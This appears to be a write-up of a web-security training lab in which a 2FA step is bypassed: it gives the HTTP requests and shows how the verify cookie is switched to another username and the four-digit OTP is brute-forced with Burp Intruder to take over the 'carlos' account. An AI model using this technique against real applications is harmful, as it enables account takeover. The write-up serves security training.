# Lab: 2FA broken logic
## Description

The auth flow consisted of the following steps:

1. User/Pass login
```yaml
POST /login HTTP/1.1
Host: ace51f141e5e278ac05621f6008b0019.web-security-academy.net

username=wiener&password=peter
```
Which would result in two cookies being set. Giving `wiener` a session that's considered to be "authenticated" by the app.
```yaml
HTTP/1.1 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=Uq28sKJbpzzbUeurwP0RLZ4eHC0EmDFT; Secure; HttpOnly; SameSite=None
```
2. The user would then be redirected to `/login2` that once triggered will send the OTP code to the user's email.  (modifying the `verify` username didn't do anything)
```yaml
GET /login2 HTTP/1.1
Host: ace51f141e5e278ac05621f6008b0019.web-security-academy.net
Cookie: verify=wiener; session=Uq28sKJbpzzbUeurwP0RLZ4eHC0EmDFT

```
3. Next we need to submit (POST) the OTP code to `/login2`. When submitting the correct code using `verify=wiener` the app would return a valid session token. When attempting to use `carlos` instead, a new session token was issued, but the OTP was rejected and the session token didn't grant access to Carlos' account.
4. I then attempted to brute-force the OTP using Burp Intruder:
```yaml
POST /login2 HTTP/1.1
Host: ace51f141e5e278ac05621f6008b0019.web-security-academy.net
Cookie: verify=carlos; session=Uq28sKJbpzzbUeurwP0RLZ4eHC0EmDFT

mfa-code=§1167§
```
Intruder was configured to enumerate all numbers between 0000-9999. 

The application didn't have any brute-force protection in place, so this wasn't hard and eventually resulted in hitting the correct OTP code and as a result a valid session token for carlos' account was issued.

## Solution
1. Login as wiener
2. Brute force the OTP code for carlos by setting the cookie to  `verify=carlos` as follows and wait for a 302 response with a valid session token for Carlos:
```yaml
POST /login2 HTTP/1.1
Cookie: verify=carlos; session=Uq28sKJbpzzbUeurwP0RLZ4eHC0EmDFT
Content-Length: 13

mfa-code=1259
```